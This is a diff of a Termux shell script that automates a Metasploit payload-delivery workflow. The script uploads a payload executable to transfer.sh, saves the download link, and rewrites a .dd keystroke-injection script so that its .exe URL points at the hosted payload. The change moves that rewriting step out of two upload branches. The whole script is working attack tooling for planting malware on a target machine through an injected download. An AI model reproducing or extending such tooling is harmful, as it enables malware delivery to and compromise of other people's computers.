@@ -60,9 +60,6 @@ if [ $UPLOAD_choice = "yy" ]; then
 	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
 	echo "\033[1;42m::::DONE\033[0m"
 	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
-	echo "::::The .dd file is creating .."
-	rm /storage/emulated/0/utiles/payload.dd
-	echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
 fi
 if [ $UPLOAD_choice = "y" ]; then
 	echo "\033[1;42m:::: Uploading the file into transfer.sh ... \033[0m"
@@ -71,11 +68,11 @@ if [ $UPLOAD_choice = "y" ]; then
 	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
 	echo "\033[1;42m::::DONE\033[0m"
 	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
-	echo "::::The .dd file is creating .."
-	rm /storage/emulated/0/utiles/payload.dd
-	echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
 fi
 
+echo "::::The .dd file is creating .."
+rm /storage/emulated/0/utiles/payload.dd
+echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
 
 echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
 echo "\nold link: \033[1;32m $(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
